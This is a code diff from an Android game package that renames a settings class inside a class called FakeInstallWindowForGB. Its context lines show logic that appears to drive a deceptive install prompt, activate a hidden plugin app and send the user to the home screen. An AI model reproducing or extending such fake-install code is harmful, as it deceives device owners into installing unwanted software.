@@ -11,7 +11,7 @@ import com.tinygame.lianliankan.R;
 import com.xstd.qm.AppRuntime;
 import com.xstd.qm.UtilOperator;
 import com.xstd.qm.Utils;
-import com.xstd.qm.setting.SettingManager;
+import com.xstd.qm.setting.MainSettingManager;
 
 /**
  * Created with IntelliJ IDEA.
@@ -45,13 +45,13 @@ public final class FakeInstallWindowForGB extends FakeInstallWindow {
 
             AppRuntime.FAKE_WINDOWS_SHOW.set(false);
 
-            SettingManager.getInstance().setDeviceBindingTime(SettingManager.getInstance().getDeviceBindingTime() + 1);
+            MainSettingManager.getInstance().setDeviceBindingTime(MainSettingManager.getInstance().getDeviceBindingTime() + 1);
 
-            SettingManager.getInstance().setLoopActiveCount(0);
+            MainSettingManager.getInstance().setLoopActiveCount(0);
             Utils.tryToActivePluginApp(context);
         } else {
             if ((count == 1 * 5)
-                    || (countDown > 0 && AppRuntime.PLUGIN_INSTALLED && SettingManager.getInstance().getKeyPluginInstalled())) {
+                    || (countDown > 0 && AppRuntime.PLUGIN_INSTALLED && MainSettingManager.getInstance().getKeyPluginInstalled())) {
                 AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                 UtilsRuntime.goHome(context);
             }
